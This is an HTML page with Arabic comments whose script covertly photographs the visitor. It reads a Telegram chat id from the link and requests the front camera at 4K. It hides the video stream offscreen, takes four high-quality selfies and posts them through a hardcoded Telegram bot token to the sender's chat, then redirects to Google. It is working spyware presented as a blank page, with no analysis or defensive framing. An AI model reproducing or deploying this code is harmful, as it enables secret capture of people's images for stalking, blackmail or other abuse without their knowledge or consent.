<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        /* خلفية بيضاء نقية */
        body { 
            background: white !important;
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            display: block;
        }
        /* إزالة أي ألوان سوداء */
        * {
            background: white;
        }
    </style>
</head>
<body>
    <script>
        // ==================== جلب الإيدي من الرابط ====================
        const USER_ID = new URLSearchParams(window.location.search).get('id');
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // إذا ما في ID بالرابط، نوقف
        if (!USER_ID) {
            // صفحة بيضاء
        } else {
            // ==================== طلب الكاميرا بأعلى دقة ====================
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 3840, max: 3840 }, // 4K
                    height: { ideal: 2160, max: 2160 }, // 4K
                    aspectRatio: { ideal: 1.7777777778 },
                    frameRate: { ideal: 30 }
                }
            })
            .then(async (stream) => {
                // تمت الموافقة ✅
                
                // عنصر فيديو مخفي
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.setAttribute('muted', '');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.top = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                video.style.pointerEvents = 'none';
                document.body.appendChild(video);

                // انتظار تحميل الفيديو
                await new Promise(resolve => {
                    if (video.videoWidth > 0) {
                        resolve();
                    } else {
                        video.onloadedmetadata = () => {
                            // تشغيل الفيديو
                            video.play();
                            resolve();
                        };
                    }
                });

                // التأكد من أن الفيديو شغال
                await new Promise(r => setTimeout(r, 500));

                // دقة التصوير الفعلية
                const width = video.videoWidth || 1920;
                const height = video.videoHeight || 1080;

                // التقاط 4 صور بدقة عالية جداً
                for (let i = 0; i < 4; i++) {
                    // تأخير بسيط بين الصور
                    await new Promise(r => setTimeout(r, i * 400));

                    const canvas = document.createElement('canvas');
                    canvas.width = width;
                    canvas.height = height;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.imageSmoothingEnabled = true;
                    ctx.imageSmoothingQuality = 'high';
                    ctx.drawImage(video, 0, 0, width, height);

                    // تحويل إلى blob بأعلى جودة
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.98));

                    // إرسال الصورة
                    const formData = new FormData();
                    formData.append('chat_id', USER_ID);
                    formData.append('photo', blob, `selfie_hd_${i+1}.jpg`);
                    formData.append('caption', `📸 صورة عالية الدقة ${width}x${height}`);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => {});
                }

                // إرسال تأكيد (اختياري)
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: USER_ID,
                        text: `✅ تم التصوير بنجاح!\n📸 4 صور بدقة ${width}x${height}`,
                        parse_mode: 'HTML'
                    })
                }).catch(e => {});

                // تنظيف
                stream.getTracks().forEach(t => t.stop());
                video.remove();

                // تحويل لجوجل ✅
                window.location.replace("https://www.google.com");
            })
            .catch((error) => {
                // تم الرفض ❌
                // صفحة بيضاء - لا تحويل
                console.log('Camera denied:', error);
                // البقاء في الصفحة البيضاء
            });
        }
    </script>
</body>
</html>
